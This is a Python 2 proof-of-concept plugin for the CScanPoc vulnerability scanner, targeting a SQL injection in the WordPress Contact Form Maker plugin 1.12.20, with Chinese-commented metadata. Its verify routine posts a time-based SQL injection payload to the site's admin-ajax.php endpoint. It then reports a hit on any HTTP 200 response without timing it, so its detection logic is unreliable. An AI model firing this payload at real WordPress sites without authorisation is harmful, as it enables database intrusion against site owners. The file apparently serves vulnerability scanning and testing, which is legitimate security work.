
# coding:utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'WordPress_0142' # 平台漏洞编号
    name = 'WordPress Contact Form Maker Plugin 1.12.20 - SQL Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2018-06-07'  # 漏洞公布时间
    desc = '''
    WordPress Contact Form Maker Plugin 1.12.20 - SQL Injection.
    WordPress联系人表单制作插件1.12.20 - SQL注入。
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/44854/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = '1.12.20'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + '/wp-admin/admin-ajax.php?action=FormMakerSQLMapping_fmc&amp;task=db_table_struct'
            payload = {
                'name':"wp_users WHERE 42=42 AND SLEEP(42)--;"
            }
            response = requests.post(url, data=payload)
            if response.status_code == 200:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
